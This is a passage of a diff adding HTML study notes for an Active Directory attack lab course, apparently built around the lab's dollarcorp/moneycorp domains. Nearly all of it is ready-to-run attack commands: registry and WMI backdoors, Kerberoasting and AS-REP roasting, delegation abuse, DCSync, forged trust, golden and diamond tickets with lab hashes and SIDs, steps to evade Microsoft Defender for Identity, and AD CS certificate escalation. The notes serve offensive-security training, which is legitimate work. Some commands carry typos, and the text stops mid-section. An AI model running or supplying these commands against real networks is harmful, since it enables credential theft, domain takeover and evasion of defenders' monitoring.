+    <pre><code>Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose <br />
+    </code></pre><br />
+4) On <strong>remote machine</strong> remove permissions:<br />
+   <pre><code>Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose<br />
+   </code></pre>
+
+<h3>PowerShell Remoting</h3>
+
+Using the RACE toolkit - PS Remoting backdoor <strong>not stable</strong> after August 2020 patches
+
+1) On <strong>local machine</strong> for student1:<br />
+   <pre><code>Set-RemotePSRemoting -SamAccountName student1 -Verbose <br />
+   </code></pre><br />
+2) On <strong>remote machine</strong> for student1 without credentials:<br />
+   <pre><code>Set-RemotePSRemoting -SamAccountNam student1 -ComputerName dcorp-dc -Verbose <br />
+   </code></pre><br />
+3) On <strong>remote machine</strong>, remove the permissions:<br />
+   <pre><code>Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove<br />
+   </code></pre>
+
+<h3>Remote Registry</h3>
+
+1) Using <strong>RACE</strong> or <strong>DAMP</strong>, with admin privs on <strong>remote machine</strong><br />
+   <pre><code>Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose<br />
+   </code></pre><br />
+2) As student1, retrieve machine account hash:<br />
+   <pre><code>Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose <br />
+   </code></pre><br />
+3) Retrieve local account hash:<br />
+   <pre><code>Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose <br />
+   </code></pre><br />
+4) Retrieve domain cached credentials:<br />
+   <pre><code>Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose<br />
+   </code></pre></li>
+</ul>
+</details>
+</details><hr />
+<details>
+<summary>🔝 Privilege Escalation
+</summary><h3>👑 AD Privilege Escalation</h3>
+
+<hr />
+
+
+<details>
+<summary>🍗 Kerberoasting
+</summary><strong>Offline cracking</strong> of <strong>service account</strong> passwords. 
+
+The Kerberos session ticket (<strong>TGS</strong>) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do <strong>offline password attack</strong>. 
+
+ℹ️ Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!
+
+<img src="img/Kerberoasting.png" alt="Kerberoasting" />
+
+#### 🔪 Commands 
+
+1) Find user accounts used as Service accounts (Account with <code>SPN</code> - Service Principal Name)<br />
+     - ActiveDirectory module<br />
+       <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName 
+       </code></pre><br />
+     - PowerView<br />
+       <pre><code>Get-DomainUser -SPN
+       </code></pre>
+
+2) Rubeus<br />
+     - Use Rubeus to list Kerberoast stats<br />
+       <pre><code>Rubeus.exe kerberoast /stats
+       </code></pre><br />
+     - Use Rubeus to request a TGS<br />
+       <pre><code>Rubeus.exe kerberoast /user:svcadmin /simple 
+       </code></pre><br />
+     - To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC<br />
+       <pre><code>Rubeus.exe kerberoast /stats /rc4opsec 
+Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
+       </code></pre><br />
+     - Kerberoast all possible accounts<br />
+       <pre><code>Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt 
+       </code></pre>
+
+3) Crack ticket using John the Ripper<br />
+     <pre><code>john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt<br />
+     </code></pre>
+
+<p>
+  Use tools like <strong>crunch</strong>, <strong>bopscrk</strong>, <strong>CeWL</strong> or others to <strong>generate custom wordlists</strong>.
+</p>
+
+<p>
+  A good <strong>collection of wordlists</strong> can be found here - <a href="https://github.com/danielmiessler/SecLists">GitHub</a>
+</p>
+</details><hr />
+
+<h3>🎯 Targeted Kerberoasting</h3>
+
+
+<details>
+<summary>📤 AS-REPs
+</summary>Target: <strong>User accounts</strong> (including <strong>service accounts</strong>) that have the Active Directory attribute "<strong>Do not require Kerberos preauthentication</strong>" (also known as <code>DONT_REQ_PREAUTH</code> or <code>UF_DONT_REQUIRE_PREAUTH</code>) <strong>enabled</strong>. 
+
+ℹ️ By default, pre-authentication is required for most accounts.
+
+ℹ️ With sufficient rights (<code>GenericWrite</code> or <code>GenericAll</code>), Kerberos preauth can be forced disabled as well.
+
+<img src="img/AS-REPs.png" alt="AS-REPs" />
+
+#### 🔪 Commands 
+
+1) Enumerating accounts with Kerberos Preauth disabled
+
+<pre><code> - Using PowerView:
+   &lt;pre&gt;&lt;code&gt;Get-DomainUser -PreauthNotRequired -Verbose 
+   &lt;/code&gt;&lt;/pre&gt;
+ - Using ActiveDirectory module:
+   &lt;pre&gt;&lt;code&gt;Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+   &lt;/code&gt;&lt;/pre&gt;
+</code></pre>
+
+2) Force disable Kerberos Preauth:
+
+<pre><code> Identify a user, modify their `useraccountcontrol` attribute to disable Kerberos pre-authentication, and then enumerate users who have pre-authentication disabled.
+
+ - PowerView
+   &lt;pre&gt;&lt;code&gt;Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} 
+
+Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose 
+
+Get-DomainUser -PreauthNotRequired -Verbose
+   &lt;/code&gt;&lt;/pre&gt;
+</code></pre>
+
+3) Request encrypted AS-REP for offline brute-force.<br />
+     C:\AD\Tools\Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt 
+
+4) We can use John The Ripper to brute-force the hashes offline<br />
+     john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
+</details><hr />
+
+
+<details>
+<summary>🔧 Set SPN
+</summary>With enough rights <code>GenericAll/GenericWrite</code>, a target user's SPN can be set to anything (unique in the domain). 
+
+We can then request a TGS without special privileges. The TGS can then be "Kerberoasted". 
+
+#### 🔪 Commands 
+
+1) Enumerate<br />
+     - Enumerate the permissions for RDPUsers on ACLs using PowerView:<br />
+       <pre><code>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+       </code></pre><br />
+     - Using Powerview, see if the user already has a SPN:<br />
+       <pre><code>Get-DomainUser -Identity supportuser | select serviceprincipalname
+       </code></pre><br />
+     - Using ActiveDirectory module:<br />
+       <pre><code>Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName 
+       </code></pre>
+
+2) Set a SPN for the user (must be unique for the forest)<br />
+     - PowerView<br />
+       <pre><code>Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
+       </code></pre><br />
+     - Using ActiveDirectory module:<br />
+       <pre><code>Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'} 
+       </code></pre>
+
+3) Kerberoast the user<br />
+     <pre><code>Rubeus.exe kerberoast /outfile:targetedhashes.txt
+
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt<br />
+     </code></pre>
+</details><hr />
+
+<h3>🎭 Kerberos Delegation</h3>
+
+Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server". 
+
+This is typically useful in multi-tier service or applications where Kerberos Double Hop is required. For example, users authenticates to a web server (first hop) and web server makes requests to a database server (second hop).
+
+ℹ️ User <strong>impersonation</strong> is the goal of delegation.
+
+<img src="img\Kerberos-Delegation.png" alt="Kerberos Delegation" />
+
+There are two types of Kerberos Delegation:<br />
+   1) <strong>General/Basic or Unconstrained Delegation</strong> - Allows the first hop (web server in our example) to request access to any service on any computer in the domain.<br />
+   2) <strong>Constrained Delegation</strong> - Allows the first hop to request access only to specified services on specified computers. If Kerberos authentication is not used to authenticate to the first hop, Protocol Transition is used to transition the request to Kerberos. 
+
+
+<details>
+<summary>🔓 Unconstrained Delegation
+</summary>It allows delegation to any service to any resource on the domain as a user.
+
+When unconstrained delegation is enabled, the DC places user's TGT inside TGS. On the first hop, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user. 
+
+<img src="img\Unconstrained-Delegation.png" alt="Unconstrained Delegation" />
+
+#### 🔪 Commands 
+
+1) Discover domain computers which have unconstrained delegation enabled:<br />
+     - using PowerView:<br />
+       <pre><code>Get-DomainComputer -UnConstrained 
+       </code></pre><br />
+     - Using ActiveDirectory module:<br />
+       <pre><code>Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADUser -Filter {TrustedForDelegation -eq $True}
+       </code></pre><br />
+  2) Compromise the server(s) where Unconstrained delegation is enabled. We must trick or wait for a domain admin to connect a service on appsrv.<br />
+     - Now, if the command is run again:<br />
+       <pre><code>SafetyKatz.exe "sekurlsa::tickets /export"
+       </code></pre><br />
+     - The DA token could be reused:<br />
+       <pre><code>Safetykatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"
+       </code></pre>
+</details><hr />
+
+
+<details>
+<summary>🚨 Unconstrained Delegation - Coercion
+</summary><strong>Certain Microsoft services and protocols</strong> allow any authenticated user to <strong>force</strong> a machine to connect to a second machine.
+
+As of January 2025, following protocols and services can be used for coercion:
+
+<table>
+<thead>
+<tr>
+  <th style="text-align:left;">Protocol</th>
+  <th style="text-align:left;">Service</th>
+  <th style="text-align:left;">Default on Server OS</th>
+  <th style="text-align:left;">Ports Required</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td style="text-align:left;">MS-RPRN</td>
+  <td style="text-align:left;">Print Spooler</td>
+  <td style="text-align:left;">Yes</td>
+  <td style="text-align:left;">445 (SMB)</td>
+</tr>
+<tr>
+  <td style="text-align:left;">MS-WSP</td>
+  <td style="text-align:left;">Windows Search</td>
+  <td style="text-align:left;">No (Default on Client OS)</td>
+  <td style="text-align:left;">445 (SMB)</td>
+</tr>
+<tr>
+  <td style="text-align:left;">MS-DFSNM (MDI detects this)</td>
+  <td style="text-align:left;">DFS Namespaces</td>
+  <td style="text-align:left;">No</td>
+  <td style="text-align:left;">445 (SMB)</td>
+</tr>
+</tbody>
+</table>
+
+<img src="img\Coercion.png" alt="Coercion" />
+
+#### 🔪 Commands 
+
+1) We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:<br />
+     <pre><code>Rubeus.exe monitor /interval:5 /nowrap<br />
+     </code></pre><br />
+  2) And after that run MS-RPRN.exe (or other) <a href="https://github.com/leechristensen/SpoolSample">GitHub - MS-RPRN.exe</a><br />
+     <pre><code>MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local  \\dcorp-appsrv.dollarcorp.moneycorp.local <br />
+     </code></pre><br />
+  3) Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:<br />
+     <pre><code>Rubeus.exe ptt /tikcet:<br />
+     </code></pre><br />
+  4) Once the ticket is injected, run DCSync:<br />
+     <pre><code>SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"<br />
+     </code></pre>
+</details><hr />
+
+
+<details>
+<summary>🔐 Constrained Delegation with Protocol Transition
+</summary>Allows access only to specified services on specified computers as a user.
+
+Protocol Transition is used when a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
+
+To impersonate the user, Service for User (<strong>S4U</strong>) extension is used which provides two extensions:
+
+1) <strong>Service for User to Self</strong> (<strong>S4U2self</strong>) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name <strong>without supplying a password</strong>.<br />
+  2) <strong>Service for User to Proxy</strong> (<strong>S4U2proxy</strong>) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by <code>msDS-AllowedToDelegateTo</code> attribute. This attribute contains a list of <strong>SPNs</strong> to which the user tokens can be forwarded.
+
+<img src="img\Constrained-Delegation-PT.png" alt="Constrained Delegation with Protocol Transition" />
+
+To abuse constrained delegation in above scenario, we need to have access to the <code>websvc</code> account. If we have access to that account, it is possible to access the services listed in <code>msDS-AllowedToDelegateTo</code> of the <code>websvc</code> account as ANY user.
+
+#### 🔪 Commands 
+
+1) Enumerate users and computers with constrained delegation enabled<br />
+     - Using PowerView<br />
+       <pre><code>Get-DomainUser -TrustedToAuth 
+Get-DomainComputer -TrustedToAuth
+       </code></pre><br />
+     - Using ActiveDirectory module:<br />
+       <pre><code>Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+       </code></pre>
+
+2) We can use the following command (We are requesting a TGT and TGS in a single command):<br />
+     <pre><code>Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt 
+
+ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$<br />
+     </code></pre>
+
+ℹ️ Another interesting issue here is that the SPN value in TGS is clear-text. This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!
+
+3) We can use the following command (Note the '/altservice' parameter):<br />
+     <pre><code>Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt <br />
+     </code></pre><br />
+  4) After injection, we can run DCSync:<br />
+     <pre><code>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" <br />
+     </code></pre>
+</details><hr />
+
+
+<details>
+<summary>🔐 Resource-based Constrained Delegation
+</summary>This moves delegation authority to the resource/service administrator.
+
+Instead of <strong>SPNs</strong> on <code>msDs-AllowedToDelegatTo</code> on the front-end service like web service, access in this case is controlled by security descriptor of <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (visible as <code>PrincipalsAllowedToDelegateToAccount</code>) on the resource/service like SQL Server service.
+
+ℹ️ That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.
+
+To abuse RBCD in the most effective form, we just need two privileges:<br />
+  1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.<br />
+  2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
+
+#### 🔪 Commands
+
+<ul>
+<li>We already have admin privileges on student VMs that are domain joined machines.<br />
+1) Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!<br />
+  <pre><code>Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+  </code></pre>
+
+2) Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :<br />
+  <pre><code>$comps = 'dcorp-student1$','dcorp-student2$' 
+Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
+  </code></pre><br />
+3) Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:<br />
+  <pre><code>Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+  </code></pre>
+
+4) Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want:<br />
+   <pre><code>Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+
+
+winrs -r:dcorp-mgmt cmd.exe  <br />
+   </code></pre></li>
+</ul>
+</details><hr />
+
+<h3>⚔️ Across Trusts</h3>
+
+<ul>
+<li><strong>Across Domains</strong> - Implicit two way trust relationship.</li>
+<li><strong>Across Forests</strong> - Trust relationship needs to be established</li>
+</ul>
+
+<img src="img\Across-Trusts.png" alt="Across Trusts" />
+
+<span style="color:red;"><strong>sIDHistory</strong></span> is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the <strong>old SID is added to</strong> <strong>sIDHistory</strong>. 
+
+<strong>sIDHistory</strong> can be abused in two ways of escalating privileges within a forest:<br />
+1) krbtgt hash of the child<br />
+2) Trust ticket
+
+<img src="img\KADT.png" alt="Kerberos - Across Domain Trusts" />
+
+
+<details>
+<summary>🎟️ Trust ticket
+</summary>This "Trust Ticket Attack" is similar to a Silver Ticket attack as both involve forging Kerberos tickets<br />
+  - <strong>Silver Ticket</strong>: forging TGS for service in the same domain<br />
+  - <strong>Trust Ticket</strong>: forging TGS for service across a domain trust
+
+<img src="img\TKA.png" alt="Enterprise Admins - Trust Key Abuse" />
+
+#### 🔪 Commands 
+
+Child to Parent using Trust Tickets
+
+1) So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent on the DC.<br />
+     <pre><code>SafetyKatz.exe "lsadump::trust /patch"
+
+OR
+
+SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"  
+
+OR
+
+SafetyKatz.exe "lsadump::lsa /patch"<br />
+     </code></pre>
+
+2) Forge an inter-realm TGT using Rubeus<br />
+     <pre><code>C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap <br />
+     </code></pre><br />
+  3) Use the forged ticket<br />
+     <pre><code>C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:&lt;FORGED TICKET&gt; <br />
+     </code></pre>
+
+<table>
+<thead>
+<tr>
+  <th><strong>Option</strong></th>
+  <th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td><code>silver</code></td>
+  <td>Name of the module</td>
+</tr>
+<tr>
+  <td><code>/rc4:17e8f4d3f4b46e95048a66a5dd890ee3</code></td>
+  <td>NTLM hash of the trust key</td>
+</tr>
+<tr>
+  <td><code>/sid:S-1-5-21-719815819-3726368948-3917688648</code></td>
+  <td>SID of the current domain</td>
+</tr>
+<tr>
+  <td><code>/sids:S-1-5-21-335606122-960912869-3279953914-519</code></td>
+  <td>SID of the enterprise admins group of the parent domain</td>
+</tr>
+<tr>
+  <td><code>/ldap</code></td>
+  <td>Retrieve PAC information from the current domain DC</td>
+</tr>
+<tr>
+  <td><code>/user:Administrator</code></td>
+  <td>Username for which the TGT is generated</td>
+</tr>
+<tr>
+  <td><code>/nowrap</code></td>
+  <td>No newlines in the output</td>
+</tr>
+</tbody>
+</table>
+</details><hr />
+
+
+<details>
+<summary>🔑 krbtgt hash of the child
+</summary>This <strong>krbtgt Secret Abuse</strong> is similar to a <strong>Golden Ticket</strong> attack as both involve forging Kerberos tickets<br />
+  - <strong>Golden Ticket</strong>: forging TGT using krbtgt key for full control in a domain<br />
+  - <strong>krbtgt Secret Abuse</strong>: forging TGT using krbtgt key to gain cross-domain access via trust
+
+ℹ️ Note that it can be used as <strong>Diamond ticket</strong> attack as will 
+
+<img src="img\krbtgt-Secret-Abuse.png" alt="krbtgt Secret Abuse" />
+
+#### 🔪 Commands 
+
+Child to Parent using krbtgt hash
+
+This is easier!<br />
+  - We need to simply forge a Golden ticket (not an inter-realm TGT) with <strong>sIDHistory</strong> of the <strong>Enterprise Admins</strong> group.
+
+1) Due to the trust, the parent domain will trust the TGT.<br />
+     <pre><code>SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"<br />
+     </code></pre>
+
+2) Avoid suspicious logs and <strong>bypass MDI</strong> by using <strong>Domain Controller identity</strong><br />
+     <pre><code>SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit" 
+
+SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"<br />
+     </code></pre><br />
+     - <code>S-1-5-21-2578538781-2508153159-3419410681-516</code> - Domain Controllers<br />
+     - <code>S-1-5-9</code> - Enterprise Domain Controllers
+<p>
+  - Avoid suspicious logs and bypass MDI by using Domain Controller identity (<strong>using Rubeus</strong>)
+</p>
+<pre><code>
+Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt 
+
+SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+   
+</code></pre>
+
+3) <strong>Diamond ticket</strong> with SID History will avoid suspicious logs on child DC and parent DC. Also <strong>bypasses MDI</strong>:<br />
+     <pre><code>Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
+
+SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"<br />
+     </code></pre>
+</details><hr />
+
+
+<details>
+<summary>👾 Across External Trusts
+</summary>Similar to a <strong>Silver Ticket</strong> and <strong>Trust Ticket</strong> Attacks, but <strong>Across Forest</strong>
+
+<img src="img\AET-TKA.png" alt="Across External Trust - Trust Key Abuse" />
+
+#### 🔪 Commands 
+
+Across Forest using Trust Tickets
+
+1) We require the trust key for the inter-forest trust from the DC that has the external trust:<br />
+     <pre><code>SafetyKatz.exe -Command '"lsadump::trust /patch"'
+
+OR
+
+SafetyKatz.exe -Command '"lsadump::lsa /patch"'<br />
+     </code></pre>
+
+2) Forge an inter-realm TGT using Rubeus<br />
+     <pre><code>C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap<br />
+     </code></pre><br />
+  3) Use the forged ticket<br />
+     <pre><code>C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:&lt;FORGED TICKET&gt; <br />
+     </code></pre>
+</details><hr />
+
+<h3>🏛️ Across domain trusts</h3>
+
+
+<details>
+<summary>📃 Active Directory Certificate Services (AD CS)
+</summary><strong>Active Directory Certificate Services (AD CS)</strong> enables use of <strong>Public Key Infrastructure (PKI)</strong> in active directory forest.
+
+AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
+
+AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.
+
+<ul>
+<li><strong>CA</strong> - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA. </li>
+<li><strong>Certificate</strong> - Issued to a user or machine and can be used for authentication, encryption, signing etc. </li>
+<li><strong>CSR</strong> - Certificate Signing Request made by a client to the CA to request a certificate.</li>
+<li><strong>Certificate Template</strong> - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.</li>
+<li><strong>EKU OIDs</strong> - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)
+
+<img src="img\ADCS.png" alt="Across domain trusts  - AD CS" /></li>
+
+<li>There are various ways of abusing ADCS!
+
+<ul>
+<li>Extract user and machine certificates</li>
+<li>Use certificates to retrieve NTLM hash</li>
+<li>User and machine level persistence</li>
+<li>Escalation to Domain Admin and Enterprise Admin</li>
+<li>Domain persistence</li>
+</ul>
+
+<table>
+<thead>
+<tr>
+  <th>Stealing Certificates</th>
+  <th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>THEFT1</td>
+  <td>Export certs with private keys using Windows' crypto APIs</td>
+</tr>
+<tr>
+  <td>THEFT2</td>
+  <td>Extracting user certs with private keys using DPAPI</td>
+</tr>
+<tr>
+  <td>THEFT3</td>
+  <td>Extracting machine certs with private keys using DPAPI</td>
+</tr>
+<tr>
+  <td>THEFT4</td>
+  <td>Steal certificates from files and stores</td>
+</tr>
+<tr>
+  <td>THEFT5</td>
+  <td>Use Kerberos PKINIT to get NTLM hash</td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr>
+  <th>Persistence</th>
+  <th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>PERSIST1</td>
+  <td>User persistence by requesting new certs</td>
+</tr>
+<tr>
+  <td>PERSIST2</td>
+  <td>Machine persistence by requesting new certs</td>
+</tr>
+<tr>
+  <td>PERSIST3</td>
+  <td>User/Machine persistence by renewing certs</td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr>
+  <th>ESC1</th>
+  <th>ESC2</th>
+  <th>ESC3</th>
+  <th>ESC4</th>
+  <th>ESC5</th>
+  <th>ESC6 (Patched - May’22)</th>
+  <th>ESC7</th>
+  <th>ESC8</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Enrolee can request cert for ANY user</td>
+  <td>Any purpose or no EKU (potentially dangerous)</td>
+  <td>Request an enrollment agent certificate and use it to request cert on behalf of ANY user</td>
+  <td>Overly permissive ACLs on templates</td>
+  <td>Poor access control on CA server, CA server computer object etc.</td>
+  <td>EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CA - Request certs for ANY user</td>
+  <td>Poor access control on roles like “CA Administrator” and “Certificate Manager”</td>
+  <td>NTLM relay to HTTP enrollment endpoints</td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr>
+  <th>ESC9</th>
+  <th>ESC10</th>
+  <th>ESC11</th>
+  <th>ESC12</th>
+  <th>ESC13</th>
+  <th>ESC14 (To be patched)</th>
+  <th>ESC15 (Patched Nov’24)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>No Security Extension (Enrolee can modify own UPN to request cert on behalf of ANY user)</td>
+  <td>Implicit Weak Certificate Mapping (modify own UPN)</td>
+  <td>NTLM relay to RPC enrolment endpoints</td>
+  <td>Steal CA private key from YubiHSM</td>
+  <td>Enrolee gets privileges of the linked Group</td>
+  <td>Auth as the target using certificate in altSecurityIdentities attribute</td>
+  <td>EKUwu – Abuse of default v1 templates to 'override' EKUs</td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr>
+  <th>Domain Persistence</th>
+  <th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>DPERSIST1</td>
+  <td>Forge certificates with stolen CA private keys</td>
+</tr>
+<tr>
+  <td>DPERSIST2</td>
+  <td>Malicious root/intermediate CAs</td>
+</tr>
+<tr>
+  <td>DPERSIST3</td>
+  <td>Backdoor CA Server, CA server computer object etc.</td>
+</tr>
+</tbody>
+</table>
+
+<h4>🔪 Commands</h4>
+
+We can use the <strong>Certify</strong> tool <a href="https://github.com/GhostPack/Certify">GitHub - Certify</a> to enumerate (and for other attacks) AD CS in the target forest:
+
+1) Enumerate Certificate Authorities (CAs):<br />
+   <pre><code>Certify.exe cas<br />
+   </code></pre><br />
+2) Enumerate the templates:<br />
+   <pre><code>Certify.exe find<br />
+   </code></pre><br />
+3) Enumerate vulnerable templates:<br />
+   <pre><code>Certify.exe find /vulnerable<br />
+   </code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>🧨 AD CS – ESC3 &amp; ESC1
+</summary>Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1 and ESC3)<br />
+  - CA grants normal/low-privileged users enrollment rights<br />
+  - Manager approval is disabled<br />
+  - Authorization signatures are not required<br />
+  - The target template grants normal/low-privileged users enrollment rights
+
+#### 🔪 Commands 
+
+1) The template <code>SmartCardEnrollment-Agent</code> allows Domain users to enroll and has "Certificate Request Agent" EKU.<br />
+     <pre><code>Certify.exe find /vulnerable<br />
+     </code></pre>
+
+<pre><code> ℹ️ The template `SmartCardEnrollment-Users` has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication.
+</code></pre>
+
+#### 🔝 Escalation to DA
+
+1) We can now request a certificate for Certificate Request Agent from <code>SmartCardEnrollmentAgent</code> template.<br />
+     <pre><code>Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent <br />
+     </code></pre>
+
+2) Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the <code>SmartCardEnrollment-Users</code> template.<br />
+     <pre><code>Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123  <br />
+     </code></pre><br />
